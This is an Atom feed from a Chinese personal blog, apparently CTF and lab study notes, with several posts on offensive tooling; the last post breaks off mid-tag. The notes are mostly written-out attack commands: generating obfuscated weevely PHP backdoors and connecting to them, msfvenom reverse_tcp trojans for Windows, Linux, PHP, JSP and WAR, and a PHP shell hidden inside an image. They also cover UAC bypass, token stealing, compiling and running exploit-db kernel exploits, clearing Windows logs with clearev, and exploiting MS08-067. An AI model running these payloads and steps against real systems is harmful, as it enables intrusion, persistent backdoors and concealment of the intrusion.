<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>做 讓 人 远 远 聽 見 的 風</title>
  
  <subtitle>杰伦的博客</subtitle>
  <link href="https://jielunya.github.io/atom.xml" rel="self"/>
  
  <link href="https://jielunya.github.io/"/>
  <updated>2023-01-12T14:56:33.034Z</updated>
  <id>https://jielunya.github.io/</id>
  
  <author>
    <name>JieLun杰伦</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>pikachu笔记(持续更新)</title>
    <link href="https://jielunya.github.io/2023/01/12/weevely%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>https://jielunya.github.io/2023/01/12/weevely%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/</id>
    <published>2023-01-12T14:24:03.249Z</published>
    <updated>2023-01-12T14:56:33.034Z</updated>
    
    <content type="html"><![CDATA[<h2 id="生成shell"><a href="#生成shell" class="headerlink" title="生成shell"></a>生成shell</h2><blockquote>weevely generate 密码 路径 文件名</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">weevely generate cmd ./backdoor.php(weevely --man中有命令)</span><br><span class="line"></span><br><span class="line">weevely generate -obfuscator cleartext1_php cmd ./backdoor.php (用模板生成混淆的shell，weevely -generate --help中有命令)</span><br></pre></td></tr></table></figure><h2 id="连接shell"><a href="#连接shell" class="headerlink" title="连接shell"></a>连接shell</h2><blockquote>weevely url 密码</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">weevely http://127.0.0.1/backdoor.php cmd</span><br></pre></td></tr></table></figure><h2 id="各项模块"><a href="#各项模块" class="headerlink" title="各项模块"></a>各项模块</h2><p>键入:help查看更多帮助信息</p><blockquote>weevely>:help</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">信息搜集：</span><br><span class="line"> :shell_su                     通过更变使用者来执行shell命令，可以获得root权限来执行命令.                                         </span><br><span class="line"> :shell_sh                     执行 shell 命令，例如:shell_php system(&#x27;dir&#x27;);                                             </span><br><span class="line"> :shell_php                    执行 PHP 命令.                                                </span><br><span class="line"> :system_extensions            收集PHP和webserver扩展列表                           </span><br><span class="line"> :system_info                  收集系统信息                                          </span><br><span class="line"> :system_procs                 列出正在运行的进程                                              </span><br><span class="line"> :audit_disablefunctionbypass  使用mod_cgi和.htaccess绕过系统禁用函数的限制。它会上传.htaccess和CGI脚本，并在远程服务器上运行伪系统shell     </span><br><span class="line"> :audit_etcpasswd              查看/etc/passwd文件                           </span><br><span class="line"> :audit_suidsgid               查找带有SUID或SGID标志的文件。                                  </span><br><span class="line"> :audit_phpconf                查看php配置信息                                             </span><br><span class="line"> :audit_filesystem             审核文件系统的弱权限。枚举各种系统目录并寻找可读写执行的目录，模块仅默认搜索部分linux下的常见目录，logs、root、home等                         </span><br><span class="line"> :backdoor_reversetcp          执行反向TCP shell. 需要nc -lvp &lt;port&gt;监听                                        </span><br><span class="line"> :backdoor_tcp                 在TCP端口上生成shell                                         </span><br><span class="line"> :net_scan                     TCP端口扫描.                                                       </span><br><span class="line"> :net_mail                     发送邮件.                                                           </span><br><span class="line"> :net_ifconfig                 获取网络接口地址.                                    </span><br><span class="line"> :net_curl                     执行类似curl的HTTP请求.                                    </span><br><span class="line"> :net_proxy                    运行本地代理以通过目标转移HTTP / HTTPS浏览 </span><br><span class="line"> :net_phpproxy                 在目标上安装PHP代理.                                     </span><br><span class="line"> :bruteforce_sql               可用来猜解数据库密码.                                             </span><br><span class="line"> :file_find                    查找具有给定名称和属性的文件.                          </span><br><span class="line"> :file_download                从远程文件系统下载文件.                                </span><br><span class="line"> :file_check                   获取文件的属性和权限.                            </span><br><span class="line"> :file_touch                   更改文件时间戳.                                               </span><br><span class="line"> :file_cd                      更改当前工作目录.                                    </span><br><span class="line"> :file_grep                    打印与多个文件中的模式匹配的行.                    </span><br><span class="line"> :file_gzip                    压缩或解压gzip文件.                                       </span><br><span class="line"> :file_tar                     压缩或解压tar文件.                                     </span><br><span class="line"> :file_enum                    检查路径列表的存在和权限</span><br><span class="line"> :file_bzip2                   压缩或解压bzip2文件.                                      </span><br><span class="line"> :file_mount                   使用HTTPfs挂载远程文件系统.                                </span><br><span class="line"> :file_clearlog                从文件中删除字符串.                                           </span><br><span class="line"> :file_zip                     压缩或解压zip文件.                                        </span><br><span class="line"> :file_cp                      复制单个文件.                                                    </span><br><span class="line"> :file_upload2web              自动将文件上传到Web文件夹并获取相应的URL. </span><br><span class="line"> :file_edit                    在本地编辑器上编辑远程文件.                                  </span><br><span class="line"> :file_read                    从远程文件系统中读取远程文件.                         </span><br><span class="line"> :file_webdownload             指定URL下载文件.                                                     </span><br><span class="line"> :file_upload                  文件上载到远程文件系统.                                    </span><br><span class="line"> :file_ls                      列出目录内容.                                              </span><br><span class="line"> :file_rm                      删除远程文件.                                                  </span><br><span class="line"> :sql_dump                     Multi dbms mysqldump replacement.                                    </span><br><span class="line"> :sql_console                  执行SQL查询或运行sql控制台. </span><br></pre></td></tr></table></figure><h2 id="反向shell连接MSF"><a href="#反向shell连接MSF" class="headerlink" title="反向shell连接MSF"></a>反向shell连接MSF</h2><blockquote>在这使用:backdoor_meterpreter参数</blockquote><blockquote>:backdoor_meterpreter反向shell</blockquote><blockquote>-payload php/meterpreter/reverse_tcp是搭载的攻击载荷</blockquote><blockquote>-lhost 转发给监听的ip地址</blockquote><blockquote>-lport   监听端口</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">weevely&gt;:backdoor_meterpreter -payload php/meterpreter/reverse_tcp -lhost 127.0.0.1 -port 4444</span><br></pre></td></tr></table></figure><blockquote>转发完成，接下来就是打开msf使用监听模块监听，获取控制权</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 &gt;use exploit/multi/handler #使用监听模块</span><br><span class="line">show options</span><br><span class="line">set payload php/meterpreter/reverse_tcp #使用与上面相同的payload</span><br><span class="line">set Lhost 127.0.0.1</span><br><span class="line">set Lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h2 id="合成图片木马"><a href="#合成图片木马" class="headerlink" title="合成图片木马"></a>合成图片木马</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat image.png shell.php &gt; shell.png</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;生成shell&quot;&gt;&lt;a href=&quot;#生成shell&quot; class=&quot;headerlink&quot; title=&quot;生成shell&quot;&gt;&lt;/a&gt;生成shell&lt;/h2&gt;&lt;blockquote&gt;weevely generate 密码 路径 文件名&lt;/blockquote&gt;

</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://jielunya.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>利用MSF进行系统提权</title>
    <link href="https://jielunya.github.io/2022/12/24/%E5%88%A9%E7%94%A8MSF%E8%BF%9B%E8%A1%8C%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/"/>
    <id>https://jielunya.github.io/2022/12/24/%E5%88%A9%E7%94%A8MSF%E8%BF%9B%E8%A1%8C%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/</id>
    <published>2022-12-24T13:09:38.000Z</published>
    <updated>2022-12-24T15:33:37.872Z</updated>
    
    <content type="html"><![CDATA[<h2 id="直接输入提升权限命令"><a href="#直接输入提升权限命令" class="headerlink" title="直接输入提升权限命令"></a>直接输入提升权限命令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter&gt;getsystem</span><br></pre></td></tr></table></figure><h2 id="使用MSF内置BYPASSUAC提权"><a href="#使用MSF内置BYPASSUAC提权" class="headerlink" title="使用MSF内置BYPASSUAC提权"></a>使用MSF内置BYPASSUAC提权</h2><blockquote>MSF内置有多个bypassuac模块，原理有所不同，使用方法类似，运行后返回一个新会话后再次执行getsystem获取系统权限。</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6&gt;search bypassuac</span><br><span class="line"></span><br><span class="line">exploit/windows/local/bypassuac</span><br><span class="line">exploit/windows/local/bypassuac_comhijack</span><br><span class="line">exploit/windows/local/bypassuac_eventvwr </span><br><span class="line">exploit/windows/local/bypassuac_fodhelper</span><br><span class="line">exploit/windows/local/bypassuac_injection</span><br><span class="line">exploit/windows/local/bypassuac_injection_winsxs</span><br><span class="line">exploit/windows/local/bypassuac_sluihijack</span><br><span class="line">exploit/windows/local/bypassuac_vbs</span><br></pre></td></tr></table></figure><h2 id="使用MSF的enum-patches模块"><a href="#使用MSF的enum-patches模块" class="headerlink" title="使用MSF的enum_patches模块"></a>使用MSF的enum_patches模块</h2><blockquote>使用MSF的enum_patches模块，收集补丁信息，然后查找可用exploits进行提权</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter&gt;run post/windows/gather/enum_patches</span><br></pre></td></tr></table></figure><blockquote>自行根据不同的补丁所存在的漏洞使用msf存在的脚本进行权限提升</blockquote><h2 id="令牌操作-INCOGNITO假冒令牌"><a href="#令牌操作-INCOGNITO假冒令牌" class="headerlink" title="令牌操作 INCOGNITO假冒令牌"></a>令牌操作 INCOGNITO假冒令牌</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter&gt;use incognito   #加载incognito模块</span><br><span class="line"></span><br><span class="line">meterpreter&gt;list_tokens -u  #查看可用的token</span><br><span class="line"></span><br><span class="line">meterpreter&gt;impersonate_token &#x27;PIG\testpig&#x27; #此处假设PIG\testpig为可用token</span><br><span class="line"></span><br><span class="line">execute -f cmd.exe -i -t      #  -t 使用假冒的token执行cmd.exe，亦可以直接输入shell进入当前token的终端</span><br><span class="line"></span><br><span class="line">rev2self  #返回原始token</span><br></pre></td></tr></table></figure><h2 id="STEAL-TOKEN窃取令牌"><a href="#STEAL-TOKEN窃取令牌" class="headerlink" title="STEAL_TOKEN窃取令牌"></a>STEAL_TOKEN窃取令牌</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter&gt;ps #先ps列出进程详细信息</span><br><span class="line"></span><br><span class="line">meterpreter&gt;steal_token &lt;pid值&gt; #从指定进程中窃取token</span><br><span class="line"></span><br><span class="line">meterpreter&gt;rev2self #返回原始token</span><br></pre></td></tr></table></figure><h2 id="利用metaspolit的内置模块Local-Exploit-Suggester"><a href="#利用metaspolit的内置模块Local-Exploit-Suggester" class="headerlink" title="利用metaspolit的内置模块Local Exploit Suggester"></a>利用metaspolit的内置模块Local Exploit Suggester</h2><blockquote>这个模块可以帮助我们识别系统存在哪些漏洞可以被利用，在拿到meterpreter会话的前提下，通过扫描，然后列出提供最合适的exp，通过合适的exp我们可以进一步提权。</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use post/multi/recon/local_exploit_suggester</span><br><span class="line"></span><br><span class="line">set LHOST &lt;ip地址&gt;</span><br><span class="line"></span><br><span class="line">set SESSION 1 #会话id</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure><h2 id="使用Ubuntu本地提权漏洞"><a href="#使用Ubuntu本地提权漏洞" class="headerlink" title="使用Ubuntu本地提权漏洞"></a>使用Ubuntu本地提权漏洞</h2><p>案例1:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">首先使用命令lsb_release -a查看系统发行的版本。</span><br><span class="line">同时使用命令uname -a查看内核版本信息</span><br></pre></td></tr></table></figure><blockquote>此处假设目标靶机的操作系统是Ubuntu 14.04.4 LTS，内核版本为3.13.0-45-generic</blockquote></blockquote>第一种方法：使用常规的溢出漏洞overlayfs，支持ubuntu 12.04/14.04/14.10/15.04和内核版本大于3.13.0小于3.19。</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit overlayfs ubuntu local #搜索中关键字overlayfs的ubuntu本地提权利用漏洞的源码</span><br><span class="line">复制/usr/share/exploitdb/exploits/linux/local/37292.c至/root目录 #此处假设源码为37292.c</span><br><span class="line">进入Meterpreter命令行，使用命令upload 37292.c将该exp上传至靶机</span><br><span class="line">最后使用命令shell打开靶机的终端</span><br><span class="line">使用命令gcc -o overlayfs 37292.c #编译exp（-o参数为命名）</span><br><span class="line">然后使用命令chmod 777 overlayfs 给exp进行赋权</span><br><span class="line">最后使用命令./overlayfs进行提权，最终获得靶机最高权限，</span><br></pre></td></tr></table></figure><p>案例2:</p><blockquote>此处假设目标靶机的操作系统是Ubuntu 16.04 LTS，内核版本为4.10.0-22-generic</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6&gt;searchsploit Ubuntu 16.04 #此处找到一个合适的漏洞为45010</span><br><span class="line"></span><br><span class="line">cd /root</span><br><span class="line"></span><br><span class="line">cp /usr/share/exploitdb/exploits/linux/local/45010.c ./    #把利用源码拷贝到当前目录</span><br><span class="line"></span><br><span class="line">gcc 45010.c -o 45010   #编译（-o参数为命名）</span><br><span class="line"></span><br><span class="line">meterpreter&gt;upload /root/45010 /tmp/45010 #(放到tem目录是因为tem目录一般都有权限)</span><br><span class="line"></span><br><span class="line">meterpreter&gt;shell</span><br><span class="line"></span><br><span class="line">cd /tem</span><br><span class="line"></span><br><span class="line">chmod +x 45010</span><br><span class="line"></span><br><span class="line">./45010</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;直接输入提升权限命令&quot;&gt;&lt;a href=&quot;#直接输入提升权限命令&quot; class=&quot;headerlink&quot; title=&quot;直接输入提升权限命令&quot;&gt;&lt;/a&gt;直接输入提升权限命令&lt;/h2&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;tabl</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://jielunya.github.io/tags/CTF/"/>
    
    <category term="linux" scheme="https://jielunya.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>MSFのreverse_tcp反向连接</title>
    <link href="https://jielunya.github.io/2022/12/19/MSF%E3%81%AEreverse_tcp%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5/"/>
    <id>https://jielunya.github.io/2022/12/19/MSF%E3%81%AEreverse_tcp%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5/</id>
    <published>2022-12-19T14:38:03.000Z</published>
    <updated>2023-01-12T14:50:52.667Z</updated>
    
    <content type="html"><![CDATA[<h2 id="msf生成linux木马文件命令"><a href="#msf生成linux木马文件命令" class="headerlink" title="msf生成linux木马文件命令"></a>msf生成linux木马文件命令</h2><h3 id="生成木马文件"><a href="#生成木马文件" class="headerlink" title="生成木马文件"></a>生成木马文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows：</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=[你的IP] lport=[端口] -f exe &gt; 保存路径/文件名</span><br><span class="line"></span><br><span class="line">Linux:</span><br><span class="line">msfvenom -p linux/x86(x64)/meterpreter/reverse_tcp lhost=[你的IP] lport=[端口] -f elf &gt; 保存路径/文件名</span><br><span class="line"></span><br><span class="line">PHP:</span><br><span class="line">msfvenom -p php/meterpreter_reverse_tcp lhost=[你的IP] lport=[端口] -f raw &gt; 保存路径/文件名.php</span><br><span class="line"></span><br><span class="line">ASP:</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=[你的IP] lport=[端口]-f asp &gt; 保存路径/文件名.asp</span><br><span class="line"></span><br><span class="line">JSP:</span><br><span class="line">msfvenom -p java/jsp_shell_reverse_tcp lhost=[你的IP] lport=[端口]-f raw &gt; 保存路径/文件名.jsp</span><br><span class="line"></span><br><span class="line">WAR:</span><br><span class="line">msfvenom -p java/jsp_shell_reverse_tcp lhost=[你的IP] lport=[端口]-f war &gt; 保存路径/文件名.war</span><br></pre></td></tr></table></figure><h3 id="配置、监听、执行"><a href="#配置、监听、执行" class="headerlink" title="配置、监听、执行"></a>配置、监听、执行</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler     #使用监听模块</span><br><span class="line">set payload linux/x64/meterpreter/reverse_tcp     #使用和木马相同的payload</span><br><span class="line">set lhost 1xx.xx.xx.xx #kali 的ip</span><br><span class="line">set lport 4444 #木马的端口</span><br></pre></td></tr></table></figure><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exploit/windows/local/bypassuac</span><br><span class="line">exploit/windows/local/bypassuac_injection</span><br><span class="line">exploit/windows/local/bypassuac_vbs</span><br></pre></td></tr></table></figure><h3 id="MSF命令大全"><a href="#MSF命令大全" class="headerlink" title="MSF命令大全"></a>MSF命令大全</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sessions    #sessions –h 查看帮助</span><br><span class="line">sessions -i &lt;ID值&gt;  #进入会话   -k  杀死会话</span><br><span class="line">background  #将当前会话放置后台</span><br><span class="line">run  #执行已有的模块，输入run后按两下tab，列出已有的脚本</span><br><span class="line">info #查看已有模块信息</span><br><span class="line">getuid # 查看权限</span><br><span class="line">getpid # 获取当前进程的pid</span><br><span class="line">sysinfo # 查看目标机系统信息</span><br><span class="line">ps # 查看当前活跃进程    kill &lt;PID值&gt; 杀死进程</span><br><span class="line">idletime #查看目标机闲置时间</span><br><span class="line">reboot / shutdown   #重启/关机</span><br><span class="line">shell #进入目标机cmd shell</span><br><span class="line">日志清除</span><br><span class="line">&gt;clearev  #清除windows中的应用程序日志、系统日志、安全日志</span><br><span class="line">upload file #向目标主机上传文件，例如：upload /root/1.txt d:\1.txt</span><br><span class="line">download file #从目标主机下载文件，例如：download d:\1.txt /root/1.txt</span><br><span class="line">search #在目标主机上搜索文件search -f *test*</span><br><span class="line">execute #在目标主机执行程序execute -H -i -f cmd.exe</span><br><span class="line">getsystem #提权</span><br></pre></td></tr></table></figure><h2 id="解决获得shell后乱码问题"><a href="#解决获得shell后乱码问题" class="headerlink" title="解决获得shell后乱码问题"></a>解决获得shell后乱码问题</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chcp 65001</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;msf生成linux木马文件命令&quot;&gt;&lt;a href=&quot;#msf生成linux木马文件命令&quot; class=&quot;headerlink&quot; title=&quot;msf生成linux木马文件命令&quot;&gt;&lt;/a&gt;msf生成linux木马文件命令&lt;/h2&gt;&lt;h3 id=&quot;生成木马文件&quot;&gt;&lt;</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://jielunya.github.io/tags/CTF/"/>
    
    <category term="linux" scheme="https://jielunya.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>MS08_067漏洞复现(xp系统渗透）</title>
    <link href="https://jielunya.github.io/2022/12/16/MS08_067%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(xp%E7%B3%BB%E7%BB%9F%E6%B8%97%E9%80%8F%EF%BC%89/"/>
    <id>https://jielunya.github.io/2022/12/16/MS08_067%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(xp%E7%B3%BB%E7%BB%9F%E6%B8%97%E9%80%8F%EF%BC%89/</id>
    <published>2022-12-16T12:46:03.000Z</published>
    <updated>2022-12-16T14:08:13.250Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><blockquote>MS08-067漏洞全称是“Windows Server服务RPC请求缓冲区溢出漏洞”，攻击者利用受害者主机默认开放的SMB服务端口445，发送特殊RPC（Remote Procedure Call，远程过程调用）请求，造成栈缓冲区内存错误，从而被利用实施远程代码执行。<p>MS08-067漏洞将会影响Windows 2000&#x2F;XP&#x2F;Server 2003&#x2F;Vista&#x2F;Server 2008的各个版本，甚至还包括 测试阶段的Windows 7 Pro-Beta。 如果用户在受影响的系统上收到特制的 RPC 请求，则该漏洞可能允许远程执行代码。 在 Microsoft Windows 2000、Windows XP 和 Windows Server 2003 系统上，攻击者可能未经身份验 证即可利用此漏洞运行任意代码。 此漏洞可能用于进行蠕虫攻击。 防火墙最佳做法和标准的默认防火 墙配置有助于保护网络资源免受从企业外部发起的攻击。</p><p>漏洞原理：</p><p>MS08-067漏洞是通过MSRPC over SMB通道调用Server程序中的NEtPathCanonicalize函数时触发的。NetPathCanonicalize函数在远程访问其他主机时，会调用NetpwPathCanonicalize函数，对远程访问的路径进行规范化，而在NetpwPathCanonicalize函数中发生了栈缓冲区内存错误（溢出），造成可被利用实施远程代码执行（Remote Code Execution）。</p></blockquote><h2 id="扫描目标靶机"><a href="#扫描目标靶机" class="headerlink" title="扫描目标靶机"></a>扫描目标靶机</h2><blockquote>获取关键信息</blockquote>nmap -A 目标ip<p><img src="/ms08_067/1.png"></p><blockquote>从中获知，445端口开放，系统版本号为xp SP2。</blockquote><h2 id="搜索漏洞"><a href="#搜索漏洞" class="headerlink" title="搜索漏洞"></a>搜索漏洞</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search ms08_067</span><br></pre></td></tr></table></figure><p><img src="/ms08_067/2.png"></p><h2 id="使用ms08-067漏洞"><a href="#使用ms08-067漏洞" class="headerlink" title="使用ms08_067漏洞"></a>使用ms08_067漏洞</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">show options</span><br></pre></td></tr></table></figure><p><img src="/ms08_067/3.png"></p><blockquote>可以看到RHOST为必填,设置payload</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set rhosts 192.168.200.133</span><br></pre></td></tr></table></figure><h2 id="选择目标系统-可略过这一步"><a href="#选择目标系统-可略过这一步" class="headerlink" title="选择目标系统(可略过这一步)"></a>选择目标系统(可略过这一步)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show targets</span><br><span class="line">set target 10</span><br></pre></td></tr></table></figure><p><img src="/ms08_067/5.png"><br><img src="/ms08_067/6.png"></p><h2 id="攻击靶机"><a href="#攻击靶机" class="headerlink" title="攻击靶机"></a>攻击靶机</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run或者exploit</span><br></pre></td></tr></table></figure><p>看到下图即为成功<br><img src="/ms08_067/4.png"></p><blockquote>进入meterpreter后输入shell进行提权，即可获得系统权限。</blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a&gt;漏洞简介&lt;/h1&gt;&lt;blockquote&gt;MS08-067漏洞全称是“Windows Server服务RPC请求缓冲区溢出漏洞”，攻击者利用受害者主</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://jielunya.github.io/tags/CTF/"/>
    
    <category term="linux" scheme="https://jielunya.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>使用MSF框架进行系统渗透（永恒之蓝）</title>
    <link href="https://jielunya.github.io/2022/12/13/%E4%BD%BF%E7%94%A8MSF%E6%A1%86%E6%9E%B6%E8%BF%9B%E8%A1%8C%E7%B3%BB%E7%BB%9F%E6%B8%97%E9%80%8F%EF%BC%88%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%EF%BC%89/"/>
    <id>https://jielunya.github.io/2022/12/13/%E4%BD%BF%E7%94%A8MSF%E6%A1%86%E6%9E%B6%E8%BF%9B%E8%A1%8C%E7%B3%BB%E7%BB%9F%E6%B8%97%E9%80%8F%EF%BC%88%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%EF%BC%89/</id>
    <published>2022-12-13T12:53:03.000Z</published>
    <updated>2022-12-13T15:26:41.364Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MSF简介"><a href="#MSF简介" class="headerlink" title="MSF简介"></a>MSF简介</h2><p>Metasploit框架（Metasploit Framework, MSF）是一个开源工具，旨在方便渗透测试，它是由Ruby程序语言编写的模板化框架，具有很好的扩展性，便于渗透测试人员开发、使用定制的工具模板。<br>Metasploit可向后端模块提供多种用来控制测试的接口（如控制台、 Web 、 CLI ）。推荐使用控制台接口，通过控制台接口，你可以访问和使用所有Metasploit的插件，例如Payload、利用模块、 Post模块等。 Metasploit还有第三方程序的接口，例如Nmap、SQLMap 等，可以直接在控制台接口里使用，要访问该界面。</p><h2 id="MSF五大模块类型"><a href="#MSF五大模块类型" class="headerlink" title="MSF五大模块类型"></a>MSF五大模块类型</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Auxiliaries（辅助模块）</span><br><span class="line">该模块不会直接在测试者和目标主机之间建立访问，它们只负责执行扫描、嗅探、指纹识别等相关功能以辅助渗透测试。</span><br><span class="line"></span><br><span class="line">Exploit（漏洞利用模块）</span><br><span class="line">漏洞利用是指由渗透测试者利用 一个系统、应用或者服务中的安全漏洞进行的攻击行为 。流行的渗透攻击技术包括缓冲区溢出、 Web应用程序攻击，以及利用配置错误等，其中包含攻击者或测试人员针对系统中的漏洞而设计的各种POC验证程序，用于破坏系统安全性的攻击代码，每个漏洞都有相应的攻击代码 。</span><br><span class="line"></span><br><span class="line">Payload（攻击载荷模块）</span><br><span class="line">攻击载荷是我们期望目标系统在被渗透攻击之后完成实际攻击功能的代码，成功渗透目标后，用于在目标系统上运行任意命令或者执行特定代码，在Metasploit框架中可以自由地选择、传送和植入 。攻击载荷也可能是简单地在目标操作系统上执行一些命令，如添加用户账号等 。</span><br><span class="line"></span><br><span class="line">Post（后期渗透模块）</span><br><span class="line">该模块主要用于在取得目标系统远程控制权后，进行一系列的后渗透攻击动作，如获取敏感信息、实施跳板攻击等。</span><br><span class="line"></span><br><span class="line">Encoders（编码工具模块）</span><br><span class="line">该模块在渗透测试中负责免杀，以防止被杀毒软件、防火墙、 IDS及类似的安全软件检测出来</span><br></pre></td></tr></table></figure><h2 id="MSF启动、退出、更新"><a href="#MSF启动、退出、更新" class="headerlink" title="MSF启动、退出、更新"></a>MSF启动、退出、更新</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">进入kali虚拟机，打开终端，输入msfconsole，进入MSF框架。</span><br><span class="line">输入命令exit退出MSF框架，来进行框架升级。</span><br><span class="line">使用MSF之前，最好将其更新，以获取更多漏洞模块的支持。</span><br><span class="line">先使用apt update，再使用apt install metasploit-framework。</span><br><span class="line">再次输入命令msfconsole，查询更新后版本，可以看到版本已更新，响应EXP等利用模块均增加了。</span><br></pre></td></tr></table></figure><h2 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h2><p>扫描和收集信息是渗透测试中的第一步，其主要目标是尽可能多地发现有关目标机器的信息。获取的信息越多，渗透的概率就越大。该步骤的主要关注点是目标机器IP地址、可用服务、开放端口等。</p><h3 id="使用辅助模块进行端口扫描"><a href="#使用辅助模块进行端口扫描" class="headerlink" title="使用辅助模块进行端口扫描"></a>使用辅助模块进行端口扫描</h3><p>辅助模块是MSF的内置模块，首先利用search portscan命令查询一下有哪些可用的端口扫描模块，执行过程如下。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 &gt; search portscan</span><br></pre></td></tr></table></figure><p><img src="/MSF%E6%A1%86%E6%9E%B6/1.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在上述结果中，可以看到有8个可用的端口扫描模块，此处以tcp端口扫描模块为例进行扫描。输入命令use auxiliary/scanner/portscan/tcp进入对应模块（看&gt;号前面的内容就知道自己所处模块位置），再输入show options查询对应模块需要使用的参数。</span><br></pre></td></tr></table></figure><p><img src="/MSF%E6%A1%86%E6%9E%B6/2.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; set RHOSTS 192.168.200.129 /设置要扫描的ip</span><br><span class="line">RHOSTS =&gt; 192.168.200.129</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; set THREADS 16 /设置线程数，越多越快</span><br><span class="line">THREADS =&gt; 16</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; run</span><br></pre></td></tr></table></figure><p><img src="/MSF%E6%A1%86%E6%9E%B6/3.png"><br>其实还有两条可选命令：setg命令和unsetg命令 。二者用于在msfconsole中设置或者取消设置全局性的参数值，从而避免重复输入相同的值。</p><h3 id="使用辅助模块进行服务扫描"><a href="#使用辅助模块进行服务扫描" class="headerlink" title="使用辅助模块进行服务扫描"></a>使用辅助模块进行服务扫描</h3><p>在扫描目标机器上运行的服务时，有多种基于服务的扫描技术可供选择，例如VNC 、FTP 、SMB等，只需执行特定类型的扫描就可以发现服务。<br>使用命令search scanner可以发现大量的扫描模块，约有600多个，建议读者多尝试不同的辅助扫描模块，了解其用法。<br>使用search scanner&#x2F;smb搜索与SMB服务相关的模块，搜索结果如下。使用的步骤与使用端口扫描模块时的基本相同.<br><img src="/MSF%E6%A1%86%E6%9E%B6/3.2.png"></p><h3 id="使用-Nmap-扫描"><a href="#使用-Nmap-扫描" class="headerlink" title="使用 Nmap 扫描"></a>使用 Nmap 扫描</h3><p>在Metasploit中同样可以使用Nmap扫描，它不仅可以用来确定目标网络上计算机的存活状态，而且可以扫描计算机的操作系统、开放端口、服务等。熟练掌握Nmap的用法可以极大地提高个人的渗透测试技术。<br>在MSF框架中可以直接使用Nmap，输入命令nmap -A 192.168.200.129对靶机进行全面扫描，过程如下，可以看到445端口开启着，可能存在利用永恒之蓝漏洞。<br><img src="/MSF%E6%A1%86%E6%9E%B6/3.1.png"></p><h2 